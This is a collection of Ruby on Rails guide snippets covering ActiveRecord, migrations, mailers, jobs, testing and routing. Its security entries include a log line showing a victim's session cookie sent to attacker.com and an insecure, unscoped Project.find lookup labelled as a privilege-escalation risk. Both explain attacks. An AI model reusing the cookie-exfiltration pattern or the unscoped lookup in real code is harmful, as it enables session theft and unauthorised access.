TITLE: Implementing Save Callbacks in Ruby on Rails
DESCRIPTION: Shows save callbacks that are triggered when a record is persisted to the database. This example demonstrates before_save, around_save, and after_save callbacks for hashing passwords, logging save operations, and updating cache.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  before_save :hash_password
  around_save :log_saving
  after_save :update_cache

  private
    def hash_password
      self.password_digest = BCrypt::Password.create(password)
      Rails.logger.info("Password hashed for user with email: #{email}")
    end

    def log_saving
      Rails.logger.info("Saving user with email: #{email}")
      yield
      Rails.logger.info("User saved with email: #{email}")
    end

    def update_cache
      Rails.cache.write(["user_data", self], attributes)
      Rails.logger.info("Update Cache")
    end
end

LANGUAGE: irb
CODE:
irb> user = User.create(name: "Jane Doe", password: "password", email: "jane.doe@example.com")

Password hashed for user with email: jane.doe@example.com
Saving user with email: jane.doe@example.com
User saved with email: jane.doe@example.com
Update Cache
=> #<User id: 1, email: "jane.doe@example.com", created_at: "2024-03-20 16:02:43.685500000 +0000", updated_at: "2024-03-20 16:02:43.685500000 +0000", name: "Jane Doe">

----------------------------------------

TITLE: Using Raw SQL with ActiveRecord in Ruby
DESCRIPTION: Shows how to use custom SQL with ActiveRecord via find_by_sql, select_all, and pluck methods. Demonstrates retrieving data with custom SQL queries and extracting specific column values.

LANGUAGE: ruby
CODE:
irb> Customer.find_by_sql("SELECT * FROM customers INNER JOIN orders ON customers.id = orders.customer_id ORDER BY customers.created_at desc")
=> [#<Customer id: 1, first_name: "Lucas" ...>, #<Customer id: 2, first_name: "Jan" ...>, ...]

LANGUAGE: ruby
CODE:
irb> Customer.lease_connection.select_all("SELECT first_name, created_at FROM customers WHERE id = '1'").to_a
=> [{"first_name"=>"Rafael", "created_at"=>"2012-11-10 23:23:45.281189"}, {"first_name"=>"Eileen", "created_at"=>"2013-12-09 11:22:35.221282"}]

LANGUAGE: ruby
CODE:
irb> Book.where(out_of_print: true).pluck(:id)
SELECT id FROM books WHERE out_of_print = true
=> [1, 2, 3]

irb> Order.distinct.pluck(:status)
SELECT DISTINCT status FROM orders
=> ["shipped", "being_packed", "cancelled"]

irb> Customer.pluck(:id, :first_name)
SELECT customers.id, customers.first_name FROM customers
=> [[1, "David"], [2, "Fran"], [3, "Jose"]]

LANGUAGE: ruby
CODE:
Customer.select(:id).map { |c| c.id }
# or
Customer.select(:id).map(&:id)
# or
Customer.select(:id, :first_name).map { |c| [c.id, c.first_name] }

LANGUAGE: ruby
CODE:
Customer.pluck(:id)

----------------------------------------

TITLE: after_commit Behavior with Failures
DESCRIPTION: Example showing how after_commit executes after data is persisted, so exceptions won't roll back the saved data. The user remains saved even if creating the event log fails.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  after_commit do
    # If this fails the user was already saved.
    EventLog.create!(event: "user_saved")
  end
end

----------------------------------------

TITLE: Using PostgreSQL Network Address Types in Rails
DESCRIPTION: Shows how to use PostgreSQL's network address types (inet, cidr, macaddr) in Rails applications. These types are useful for storing IP addresses, network prefixes, and MAC addresses with proper validation and functionality.

LANGUAGE: ruby
CODE:
# db/migrate/20140508144913_create_devices.rb
create_table(:devices, force: true) do |t|
  t.inet "ip"
  t.cidr "network"
  t.macaddr "address"
end

----------------------------------------

TITLE: Secure Regular Expression for URL Validation in Ruby
DESCRIPTION: Demonstrates the correct way to validate URLs in Ruby using \A and \z anchors, which properly match the beginning and end of the entire string.

LANGUAGE: ruby
CODE:
/\Ahttps?:\/\/[^\n]+\z/i

----------------------------------------

TITLE: Using Logger Methods for Different Severity Levels in Rails
DESCRIPTION: Demonstrates how to use various logger methods for different severity levels (debug, info, warn, error, fatal) within controllers, models, or mailers.

LANGUAGE: ruby
CODE:
logger.debug "Person attributes hash: #{@person.attributes.inspect}"
logger.info "Processing the request..."
logger.fatal "Terminating application, raised unrecoverable error!!!"

----------------------------------------

TITLE: Handling Record Not Found Exceptions with rescue_from
DESCRIPTION: Implements a custom handler for ActiveRecord::RecordNotFound exceptions using rescue_from in the ApplicationController. This example returns a plain text response with a 404 status code when a record is not found.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  rescue_from ActiveRecord::RecordNotFound, with: :record_not_found

  private
    def record_not_found
      render plain: "Record Not Found", status: 404
    end
end

----------------------------------------

TITLE: Controller Create Action Test
DESCRIPTION: Shows a complete test for the create action, checking if a record is created and proper redirection occurs.

LANGUAGE: ruby
CODE:
test "should create article" do
  assert_difference("Article.count") do
    post articles_url, params: { article: { body: "Rails is awesome!", title: "Hello Rails" } }
  end

  assert_redirected_to article_path(Article.last)
end

----------------------------------------

TITLE: Using UUID Primary Keys in Rails with PostgreSQL
DESCRIPTION: Shows how to set up UUID primary keys in Rails by enabling the pgcrypto extension and configuring tables to use UUID as their primary key type.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_devices.rb
enable_extension "pgcrypto" unless extension_enabled?("pgcrypto")
create_table :devices, id: :uuid do |t|
  t.string :kind
end

LANGUAGE: ruby
CODE:
# app/models/device.rb
class Device < ApplicationRecord
end

LANGUAGE: irb
CODE:
irb> device = Device.create
irb> device.id
=> "814865cd-5a1d-4771-9306-4268f188fe9e"

LANGUAGE: bash
CODE:
$ rails generate model Device --primary-key-type=uuid kind:string

LANGUAGE: bash
CODE:
$ rails generate model Case device_id:uuid

----------------------------------------

TITLE: Applying Limit and Offset in ActiveRecord Queries
DESCRIPTION: Shows how to use 'limit' and 'offset' methods to restrict the number of records returned and skip a specified number of records for pagination.

LANGUAGE: ruby
CODE:
Customer.limit(5)

LANGUAGE: sql
CODE:
SELECT * FROM customers LIMIT 5

LANGUAGE: ruby
CODE:
Customer.limit(5).offset(30)

LANGUAGE: sql
CODE:
SELECT * FROM customers LIMIT 5 OFFSET 30

----------------------------------------

TITLE: Broadcasting Turbo Streams from Models
DESCRIPTION: Ruby code showing how to broadcast Turbo Streams from a Rails model using callbacks. The example uses after_create_commit to broadcast new posts to subscribers.

LANGUAGE: ruby
CODE:
class Post < ApplicationRecord
  after_create_commit { broadcast_append_to("posts") }
end

----------------------------------------

TITLE: Making a Fetch Request with JSON Parameters in JavaScript
DESCRIPTION: Example of how to make a fetch request from JavaScript with JSON-encoded parameters that can be properly parsed by ActionDispatch::Request in Rails.

LANGUAGE: javascript
CODE:
fetch('/people', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ person: { firstName: 'Yehuda', lastName: 'Katz' } })
}).then(response => response.json())

----------------------------------------

TITLE: Testing Jobs in Isolation with ActiveJob in Rails
DESCRIPTION: An example of testing a billing job in isolation using ActiveJob::TestCase. It demonstrates how to use perform_enqueued_jobs to actually execute the queued jobs and verify their effects during the test.

LANGUAGE: ruby
CODE:
require "test_helper"

class BillingJobTest < ActiveJob::TestCase
  test "account is charged" do
    perform_enqueued_jobs do
      BillingJob.perform_later(account, product)
    end
    assert account.reload.charged_for?(product)
  end
end

----------------------------------------

TITLE: Rendering JSON Response
DESCRIPTION: Converting an object to JSON and sending it as a response using the :json option to render. Rails automatically calls to_json on the object being rendered.

LANGUAGE: ruby
CODE:
render json: @product

----------------------------------------

TITLE: Implementing Conditional GET Support with Model Object in Rails Controller
DESCRIPTION: Implements HTTP conditional GET support by passing a model object directly to the stale? method. Rails uses the model's updated_at and cache_key_with_version methods to determine if content is fresh.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def show
    @product = Product.find(params[:id])

    if stale?(@product)
      respond_to do |wants|
        # ... normal response processing
      end
    end
  end
end

----------------------------------------

TITLE: Insecure Project Record Lookup - Privilege Escalation Risk
DESCRIPTION: Demonstrates an insecure way to find a Project record using an unfiltered user-provided ID parameter, which can lead to privilege escalation.

LANGUAGE: ruby
CODE:
@project = Project.find(params[:id])

----------------------------------------

TITLE: Configuring Database Connection Pooling in Rails
DESCRIPTION: This YAML configuration demonstrates how to set database connection pool parameters in a Rails application's database.yml file. It specifies the database adapter, file path, connection pool size, and timeout settings.

LANGUAGE: yaml
CODE:
development:
  adapter: sqlite3
  database: storage/development.sqlite3
  pool: 5
  timeout: 5000

----------------------------------------

TITLE: Generating Migration for UUID Primary Key Tables in Rails
DESCRIPTION: An example migration class that creates a table with UUID primary keys. This shows the standard pattern generated by Rails when configured to use UUIDs instead of integer IDs.

LANGUAGE: ruby
CODE:
class CreateAuthors < ActiveRecord::Migration[8.1]
  def change
    create_table :authors, id: :uuid do |t|
      t.timestamps
    end
  end
end

----------------------------------------

TITLE: Declaring a has_many Association in Rails
DESCRIPTION: This snippet shows how to declare a has_many association in a Rails model. It demonstrates setting up a one-to-many relationship between Author and Book models.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books
end

----------------------------------------

TITLE: Performing calculations in Rails ActiveRecord
DESCRIPTION: Shows how to use various calculation methods (count, average, minimum, maximum, sum) on ActiveRecord models and relations to get aggregate values from database tables.

LANGUAGE: ruby
CODE:
Customer.count
SELECT COUNT(*) FROM customers

LANGUAGE: ruby
CODE:
Customer.where(first_name: 'Ryan').count
SELECT COUNT(*) FROM customers WHERE (first_name = 'Ryan')

LANGUAGE: ruby
CODE:
Customer.includes("orders").where(first_name: 'Ryan', orders: { status: 'shipped' }).count

LANGUAGE: ruby
CODE:
Order.average("subtotal")

LANGUAGE: ruby
CODE:
Order.minimum("subtotal")

LANGUAGE: ruby
CODE:
Order.maximum("subtotal")

LANGUAGE: ruby
CODE:
Order.sum("subtotal")

----------------------------------------

TITLE: Text Template for Welcome Email
DESCRIPTION: A plain text ERB template for the welcome email, which serves as a fallback if HTML rendering fails. It contains the same information as the HTML version but formatted for plain text.

LANGUAGE: erb
CODE:
Welcome to example.com, <%= @user.name %>
===============================================

You have successfully signed up to example.com,
your username is: <%= @user.login %>.

To login to the site, just follow this link: <%= @url %>.

Thanks for joining and have a great day!

----------------------------------------

TITLE: Adding Debugger Breakpoint in Rails Controller
DESCRIPTION: Code demonstrating how to insert a debugger breakpoint in a Rails controller by using the 'debugger' statement, which will pause execution when that line is reached.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  before_action :set_post, only: %i[ show edit update destroy ]

  # GET /posts or /posts.json
  def index
    @posts = Post.all
    debugger
  end
  # ...
end

----------------------------------------

TITLE: Sending Emails to Multiple Recipients with Default Configuration
DESCRIPTION: Example of a mailer class that sends emails to multiple recipients by default. It uses Admin.pluck(:email) to dynamically fetch all admin email addresses as the recipients.

LANGUAGE: ruby
CODE:
class AdminMailer < ApplicationMailer
  default to: -> { Admin.pluck(:email) },
          from: "notification@example.com"

  def new_registration(user)
    @user = user
    mail(subject: "New User Signup: #{@user.email}")
  end
end

----------------------------------------

TITLE: Defining has_one and belongs_to Associations in Rails Models
DESCRIPTION: This code demonstrates how to set up bi-directional associations between two models using has_one and belongs_to. The Supplier has one account, and the Account belongs to a supplier with a validation on the terms field.

LANGUAGE: ruby
CODE:
# app/models/supplier.rb
class Supplier < ApplicationRecord
  has_one :account
end

# app/models/account.rb
class Account < ApplicationRecord
  validates :terms, presence: true
  belongs_to :supplier
end

----------------------------------------

TITLE: Creating and registering email observers in Rails
DESCRIPTION: Demonstrates creating an email observer class that logs delivery information after emails are sent, and shows how to register it in a Rails initializer using the observers configuration option.

LANGUAGE: ruby
CODE:
class EmailDeliveryObserver
  def self.delivered_email(message)
    EmailDelivery.log(message)
  end
end

LANGUAGE: ruby
CODE:
Rails.application.configure do
  config.action_mailer.observers = %w[EmailDeliveryObserver]
end

----------------------------------------

TITLE: Reverting Previous Migrations with revert method in Ruby on Rails
DESCRIPTION: Demonstrates how to roll back a previous migration using the revert method, which handles all the complexities of properly reversing another migration's actions.

LANGUAGE: ruby
CODE:
require_relative "20121212123456_example_migration"

class FixupExampleMigration < ActiveRecord::Migration[8.1]
  def change
    revert ExampleMigration

    create_table(:apples) do |t|
      t.string :variety
    end
  end
end

----------------------------------------

TITLE: Selectively Reverting Parts of Previous Migrations in Ruby on Rails
DESCRIPTION: Shows how to use the revert method with a block to selectively revert specific parts of a previous migration without affecting other parts. This is useful for undoing specific changes from a previous migration.

LANGUAGE: ruby
CODE:
class DontUseDistributorsViewMigration < ActiveRecord::Migration[8.1]
  def change
    revert do
      # copy-pasted code from ExampleMigration
      create_table :distributors do |t|
        t.string :zipcode
      end

      reversible do |direction|
        direction.up do
          # create a distributors view
          execute <<-SQL
            CREATE VIEW distributors_view AS
            SELECT id, zipcode
            FROM distributors;
          SQL
        end
        direction.down do
          execute <<-SQL
            DROP VIEW distributors_view;
          SQL
        end
      end

      # The rest of the migration was ok
    end
  end
end

----------------------------------------

TITLE: Configuring CSP Nonce Directives
DESCRIPTION: This configuration specifies which Content Security Policy directives should use nonces. In this example, only script-src will use nonces, while other directives like style-src will not.

LANGUAGE: ruby
CODE:
Rails.application.config.content_security_policy_nonce_directives = %w(script-src)

----------------------------------------

TITLE: Creating Reusable Authentication Test Helper
DESCRIPTION: Defines a SignInHelper module that provides a sign_in_as method for use in integration tests. The helper is included in the ActionDispatch::IntegrationTest class so it's available in all integration tests.

LANGUAGE: ruby
CODE:
# test/test_helper.rb

module SignInHelper
  def sign_in_as(user)
    post sign_in_url(email: user.email, password: user.password)
  end
end

class ActionDispatch::IntegrationTest
  include SignInHelper
end

----------------------------------------

TITLE: Using Rails Console with Sandbox Mode
DESCRIPTION: Demonstrates starting the Rails console in sandbox mode, which rolls back any changes made during the session. This is useful for experimenting without affecting production data.

LANGUAGE: bash
CODE:
$ bin/rails console --sandbox
Loading development environment in sandbox (Rails 8.1.0)
Any modifications you make will be rolled back on exit
irb(main):001:0>

----------------------------------------

TITLE: Scheduling a Job for a Specific Time in Rails
DESCRIPTION: Shows how to schedule a job to be performed at a specific time in the future using the set method with wait_until parameter.

LANGUAGE: ruby
CODE:
# Enqueue a job to be performed tomorrow at noon.
GuestsCleanupJob.set(wait_until: Date.tomorrow.noon).perform_later(guest)

----------------------------------------

TITLE: Watching Variable Changes in Rails Debugger with watch Command
DESCRIPTION: This snippet shows how to use the 'watch' command to monitor changes to instance variables and stop execution when they're modified, useful for tracking state changes in your application.

LANGUAGE: ruby
CODE:
[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
    20|   end
    21|
    22|   # POST /posts or /posts.json
    23|   def create
    24|     @post = Post.new(post_params)
=>  25|     debugger
    26|
    27|     respond_to do |format|
    28|       if @post.save!
    29|         format.html { redirect_to @post, notice: "Post was successfully created." }
=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25
  #1    ActionController::BasicImplicitRender#send_action(method="create", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg) watch @_response_body    # command
#0  BP - Watch  #<PostsController:0x00007fce69ca5320> @_response_body =

LANGUAGE: ruby
CODE:
(rdbg) c    # continue command
[173, 182] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal.rb
   173|       body = [body] unless body.nil? || body.respond_to?(:each)
   174|       response.reset_body!
   175|       return unless body
   176|       response.body = body
   177|       super
=> 178|     end
   179|
   180|     # Tests if render or redirect has already happened.
   181|     def performed?
   182|       response_body || response.committed?
=>#0    ActionController::Metal#response_body=(body=["<html><body>You are being <a href=\"ht...) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal.rb:178 #=> ["<html><body>You are being <a href=\"ht...
  #1    ActionController::Redirecting#redirect_to(options=#<Post id: 13, title: "qweqwe", content:..., response_options={:allow_other_host=>false}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/redirecting.rb:74
  # and 82 frames (use `bt' command for all frames)

Stop by #0  BP - Watch  #<PostsController:0x00007fce69ca5320> @_response_body =  -> ["<html><body>You are being <a href=\"http://localhost:3000/posts/13\">redirected</a>.</body></html>"]
(rdbg)

----------------------------------------

TITLE: Adding Customized Attachments with Specific Encoding in Rails Mailers
DESCRIPTION: Ruby code demonstrating how to add attachments with custom MIME type and encoding to emails in Action Mailer. This approach gives more control over attachment properties.

LANGUAGE: ruby
CODE:
encoded_content = SpecialEncode(File.read("/path/to/filename.jpg"))
attachments["filename.jpg"] = {
  mime_type: "application/gzip",
  encoding: "SpecialEncoding",
  content: encoded_content
}

----------------------------------------

TITLE: Using Model Validations in Rails Console
DESCRIPTION: Demonstrates how validations work in practice using Rails console. Shows the behavior of save, save!, and validations error messages when attempting to save an invalid record.

LANGUAGE: ruby
CODE:
irb> user = User.new
irb> user.save
=> false
irb> user.save!
ActiveRecord::RecordInvalid: Validation failed: Name can't be blank

----------------------------------------

TITLE: Grouping Association Results with group in Rails
DESCRIPTION: Shows how to use the group method to group the result set by a specific attribute using a GROUP BY clause in the SQL query. This example groups assemblies by factory.

LANGUAGE: ruby
CODE:
class Parts < ApplicationRecord
  has_and_belongs_to_many :assemblies, -> { group "factory" }
end

----------------------------------------

TITLE: Configuring MemCacheStore with Multiple Servers in Rails
DESCRIPTION: Sets up a Memcached-based cache store with multiple server addresses. This implementation uses the dalli gem to provide a centralized cache for high-performance and redundancy in production environments.

LANGUAGE: ruby
CODE:
config.cache_store = :mem_cache_store, "cache-1.example.com", "cache-2.example.com"

----------------------------------------

TITLE: Managing Locale with around_action in ApplicationController
DESCRIPTION: Implements locale switching using an around_action in the ApplicationController. The locale is set based on the request parameters and managed using I18n.with_locale to prevent leaking between requests.

LANGUAGE: ruby
CODE:
around_action :switch_locale

def switch_locale(&action)
  locale = params[:locale] || I18n.default_locale
  I18n.with_locale(locale, &action)
end

----------------------------------------

TITLE: Asynchronous Email Delivery with Action Mailer and Active Job
DESCRIPTION: Shows how to send emails asynchronously using Action Mailer's integration with Active Job through the deliver_later method, which prevents email sending from blocking the request-response cycle.

LANGUAGE: ruby
CODE:
# If you want to send the email now use #deliver_now
UserMailer.welcome(@user).deliver_now

# If you want to send the email through Active Job use #deliver_later
UserMailer.welcome(@user).deliver_later

----------------------------------------

TITLE: Configuring Parallel Testing with Threads in Rails
DESCRIPTION: Sets up parallel testing to use threads instead of the default fork method. This is especially useful for JRuby or TruffleRuby environments or when thread-based parallelization is preferred.

LANGUAGE: ruby
CODE:
class ActiveSupport::TestCase
  parallelize(workers: :number_of_processors, with: :threads)
end

----------------------------------------

TITLE: Defining and Using Composite Primary Keys with query_constraints
DESCRIPTION: Example of using the query_constraints macro to define virtual primary keys for models that require composite keys, particularly useful for many-to-many relationships.

LANGUAGE: ruby
CODE:
class TravelRoute < ActiveRecord::Base
  query_constraints :origin, :destination
end

----------------------------------------

TITLE: Adding References in Rails Migrations
DESCRIPTION: Demonstrates how to create a foreign key column using add_reference. This creates a role_id column in the users table that references the id column in the roles table, and also creates an index for the column.

LANGUAGE: ruby
CODE:
add_reference :users, :role

----------------------------------------

TITLE: Using Constraint Blocks for Multiple Routes in Rails
DESCRIPTION: Applies the same constraints to multiple routes using a constraints block. This creates a group of routes that all share the same request-based constraints.

LANGUAGE: ruby
CODE:
constraints subdomain: "admin" do
  resources :photos
end

----------------------------------------

TITLE: HTML Output for collection_radio_buttons Helper
DESCRIPTION: The HTML output generated by the collection_radio_buttons helper, showing a set of radio buttons with labels. Each radio button's value is the city ID, and the label text is the city name.

LANGUAGE: html
CODE:
<input type="radio" value="1" name="person[city_id]" id="person_city_id_1">
<label for="person_city_id_1">Berlin</label>

<input type="radio" value="3" name="person[city_id]" id="person_city_id_3">
<label for="person_city_id_3">Chicago</label>

<input type="radio" value="2" name="person[city_id]" id="person_city_id_2">
<label for="person_city_id_2">Madrid</label>

----------------------------------------

TITLE: Creating Path with Objects Using Rails Routing Helpers
DESCRIPTION: Shows how to use routing helpers with model instances instead of IDs. Rails automatically extracts the necessary IDs from the provided objects to generate the correct path.

LANGUAGE: erb
CODE:
<%= link_to 'Ad details', magazine_ad_path(@magazine, @ad) %>

----------------------------------------

TITLE: Using HAVING Conditions in ActiveRecord Queries
DESCRIPTION: Demonstrates using the 'having' method to filter grouped results based on aggregate conditions, similar to SQL HAVING clause.

LANGUAGE: ruby
CODE:
Order.select("created_at as ordered_date, sum(total) as total_price").
  group("created_at").having("sum(total) > ?", 200)

LANGUAGE: sql
CODE:
SELECT created_at as ordered_date, sum(total) as total_price
FROM orders
GROUP BY created_at
HAVING sum(total) > 200

LANGUAGE: ruby
CODE:
big_orders = Order.select("created_at, sum(total) as total_price")
                  .group("created_at")
                  .having("sum(total) > ?", 200)

big_orders[0].total_price
# Returns the total price for the first Order object

----------------------------------------

TITLE: Specifying Sort Direction in Rails Queries
DESCRIPTION: Demonstrates how to specify ascending or descending sort direction when ordering query results in Rails.

LANGUAGE: ruby
CODE:
Book.order(created_at: :desc)
# OR
Book.order(created_at: :asc)
# OR
Book.order("created_at DESC")
# OR
Book.order("created_at ASC")

----------------------------------------

TITLE: Creating a Books Table Using SQL
DESCRIPTION: SQL statement to create a books table with id, title, and author columns. This demonstrates the raw SQL approach, though this isn't the typical Rails way.

LANGUAGE: sql
CODE:
CREATE TABLE books (
  id int(11) NOT NULL auto_increment,
  title varchar(255),
  author varchar(255),
  PRIMARY KEY  (id)
);

----------------------------------------

TITLE: Creating Custom Serializers for Active Job Arguments in Rails
DESCRIPTION: Demonstrates how to extend Active Job's serialization capabilities by defining a custom serializer for a complex type (Money in this example), enabling it to be passed to background jobs.

LANGUAGE: ruby
CODE:
# app/serializers/money_serializer.rb
class MoneySerializer < ActiveJob::Serializers::ObjectSerializer
  # Converts an object to a simpler representative using supported object types.
  # The recommended representative is a Hash with a specific key. Keys can be of basic types only.
  # You should call `super` to add the custom serializer type to the hash.
  def serialize(money)
    super(
      "amount" => money.amount,
      "currency" => money.currency
    )
  end

  # Converts serialized value into a proper object.
  def deserialize(hash)
    Money.new(hash["amount"], hash["currency"])
  end

  private
    # Checks if an argument should be serialized by this serializer.
    def klass
      Money
    end
end

----------------------------------------

TITLE: Manual Shard Switching for Writing Operations
DESCRIPTION: Example of manually switching between database shards to perform write operations on different shards using the connected_to API.

LANGUAGE: ruby
CODE:
ShardRecord.connected_to(role: :writing, shard: :shard_one) do
  @person = Person.create! # Creates a record in shard shard_one
end

ShardRecord.connected_to(role: :writing, shard: :shard_two) do
  Person.find(@person.id) # Can't find record, doesn't exist because it was created
                   # in the shard named ":shard_one".
end

----------------------------------------

TITLE: Adding Inventory Count Validation to Product Model
DESCRIPTION: Demonstrates how to add a validation to ensure the inventory count is never negative. Uses the numericality validator with greater_than_or_equal_to option.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_one_attached :featured_image
  has_rich_text :description

  validates :name, presence: true
  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }
end

----------------------------------------

TITLE: Allow Blank Validation Option in Rails
DESCRIPTION: This snippet shows the allow_blank option which skips validation for blank values (nil or empty string). The Topic model requires titles to be exactly 6 characters long, unless they are blank.

LANGUAGE: ruby
CODE:
class Topic < ApplicationRecord
  validates :title, length: { is: 6 }, allow_blank: true
end

----------------------------------------

TITLE: Boolean Field Validation in Rails
DESCRIPTION: Shows how to properly validate boolean fields since false.blank? evaluates to true. These approaches ensure the field is either true/false or not nil.

LANGUAGE: ruby
CODE:
# Value _must_ be true or false
validates :boolean_field_name, inclusion: [true, false]
# Value _must not_ be nil, aka true or false
validates :boolean_field_name, exclusion: [nil]

----------------------------------------

TITLE: Creating a Record with an Encrypted Attribute
DESCRIPTION: Example showing how the encryption is transparent to application code. The attribute is accessed normally in Ruby but stored encrypted in the database.

LANGUAGE: ruby
CODE:
article = Article.create title: "Encrypt it all!"
article.title # => "Encrypt it all!"

----------------------------------------

TITLE: Using a Custom Form Helper with FormBuilder
DESCRIPTION: Shows how to use the labeled_form_with helper that automatically applies a custom FormBuilder. This simplifies the form creation by eliminating the need to specify the builder option directly.

LANGUAGE: erb
CODE:
<%= labeled_form_with model: @person do |form| %>
  <%= form.text_field :first_name %>
<% end %>

----------------------------------------

TITLE: Adding Navigation with Logout Button to Rails Layout
DESCRIPTION: ERB template for the application layout that adds a navigation bar with home link and logout button. The logout button is only shown when a user is authenticated and sends a DELETE request to the session path.

LANGUAGE: erb
CODE:
<!DOCTYPE html>
<html>
  <!-- ... -->
  <body>
    <nav>
      <%= link_to "Home", root_path %>
      <%= button_to "Log out", session_path, method: :delete if authenticated? %>
    </nav>

    <main>
      <%= yield %>
    </main>
  </body>
</html>

----------------------------------------

TITLE: Configuring Deterministic Encryption for Unique Indexes
DESCRIPTION: Sets up deterministic encryption for an attribute that needs to support unique database indexes. This ensures the ciphertext remains consistent for the same input values.

LANGUAGE: ruby
CODE:
class Person
  encrypts :email_address, deterministic: true
end

----------------------------------------

TITLE: Broadcasting with Data from Ruby
DESCRIPTION: Shows how to broadcast a message with specific data to a chat room. This is typically called from elsewhere in the application, such as a job.

LANGUAGE: ruby
CODE:
# Somewhere in your app this is called, perhaps
# from a NewCommentJob.
ActionCable.server.broadcast(
  "chat_#{room}",
  {
    sent_by: "Paul",
    body: "This is a cool chat app."
  }
)

----------------------------------------

TITLE: Secure Parameterized Query with Named Placeholders
DESCRIPTION: Demonstrates using named placeholders in SQL queries to safely handle user input and prevent SQL injection attacks.

LANGUAGE: ruby
CODE:
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first

----------------------------------------

TITLE: Specifying Queue for Active Job
DESCRIPTION: Example of using queue_as to assign a job to a specific queue. This allows jobs to be prioritized and processed according to their importance.

LANGUAGE: ruby
CODE:
class GuestsCleanupJob < ApplicationJob
  queue_as :low_priority
  # ...
end

----------------------------------------

TITLE: Defining Routing Concerns in Rails
DESCRIPTION: Shows how to define reusable routing concerns that encapsulate common route patterns. Concerns allow for DRY route definitions that can be shared across multiple resources.

LANGUAGE: ruby
CODE:
concern :commentable do
  resources :comments
end

concern :image_attachable do
  resources :images, only: :index
end

----------------------------------------

TITLE: Creating Custom Rails Environment Configurations
DESCRIPTION: This snippet demonstrates how to create a custom environment configuration (staging) by extending an existing environment (production). This allows for environment-specific settings while inheriting common configuration.

LANGUAGE: ruby
CODE:
# config/environments/staging.rb
require_relative "production"

Rails.application.configure do
  # Staging overrides
end

----------------------------------------

TITLE: Testing Update Action in Rails Controller
DESCRIPTION: This test verifies that the update action of an ArticlesController correctly updates an article's attributes. It patches the article URL with new parameters and checks that the title was updated after reloading the article.

LANGUAGE: ruby
CODE:
test "should update article" do
  article = articles(:one)

  patch article_url(article), params: { article: { title: "updated" } }

  assert_redirected_to article_path(article)
  # Reload article to refresh data and assert that title is updated.
  article.reload
  assert_equal "updated", article.title
end

----------------------------------------

TITLE: Setting a Default Sender with Name in Action Mailer
DESCRIPTION: Example of using the email_address_with_name method to set a default sender name and email address for all emails sent from a mailer class, providing a consistent sender identity.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  default from: email_address_with_name("notification@example.com", "Example Company Notifications")
end

----------------------------------------

TITLE: Using UUID Data Type in PostgreSQL with Rails
DESCRIPTION: Shows how to use PostgreSQL's UUID data type in Rails applications, including setting up migrations, defining models, and creating relationships using UUID primary keys. Demonstrates enabling the pgcrypto extension for UUID support.

LANGUAGE: ruby
CODE:
# db/migrate/20131220144913_create_revisions.rb
create_table :revisions do |t|
  t.uuid :identifier
end

LANGUAGE: ruby
CODE:
# app/models/revision.rb
class Revision < ApplicationRecord
end

LANGUAGE: ruby
CODE:
irb> Revision.create identifier: "A0EEBC99-9C0B-4EF8-BB6D-6BB9BD380A11"

irb> revision = Revision.first
irb> revision.identifier
=> "a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11"

LANGUAGE: ruby
CODE:
# db/migrate/20150418012400_create_blog.rb
enable_extension "pgcrypto" unless extension_enabled?("pgcrypto")
create_table :posts, id: :uuid

create_table :comments, id: :uuid do |t|
  # t.belongs_to :post, type: :uuid
  t.references :post, type: :uuid
end

LANGUAGE: ruby
CODE:
# app/models/post.rb
class Post < ApplicationRecord
  has_many :comments
end

LANGUAGE: ruby
CODE:
# app/models/comment.rb
class Comment < ApplicationRecord
  belongs_to :post
end

----------------------------------------

TITLE: Rendering Rich Text Content in Views
DESCRIPTION: ERB code showing how to render the sanitized rich text content in a view, which automatically handles proper HTML display of the formatted text.

LANGUAGE: html+erb
CODE:
<%= @article.content %>

----------------------------------------

TITLE: Server Log Example of Cookie Theft
DESCRIPTION: An example of what appears in an attacker's server logs after a successful cookie theft via the image request technique. This shows how the victim's session cookie becomes visible to the attacker.

LANGUAGE: html
CODE:
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2

----------------------------------------

TITLE: Implementing Product Destruction in Rails ProductsController
DESCRIPTION: Complete ProductsController implementation with destroy action for handling DELETE requests to /products/:id. The destroy method finds the product using the set_product before_action, destroys it, and redirects to the products index page.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  before_action :set_product, only: %i[ show edit update destroy ]

  def index
    @products = Product.all
  end

  def show
  end

  def new
    @product = Product.new
  end

  def create
    @product = Product.new(product_params)
    if @product.save
      redirect_to @product
    else
      render :new, status: :unprocessable_entity
    end
  end

  def edit
  end

  def update
    if @product.update(product_params)
      redirect_to @product
    else
      render :edit, status: :unprocessable_entity
    end
  end

  def destroy
    @product.destroy
    redirect_to products_path
  end

  private
    def set_product
      @product = Product.find(params[:id])
    end

    def product_params
      params.expect(product: [ :name ])
    end
end

----------------------------------------

TITLE: Sending Data to a Channel from JavaScript
DESCRIPTION: Shows how to send data to a channel from the client side, which can then be rebroadcast to all subscribers. This example sends a chat message to be distributed to all clients.

LANGUAGE: javascript
CODE:
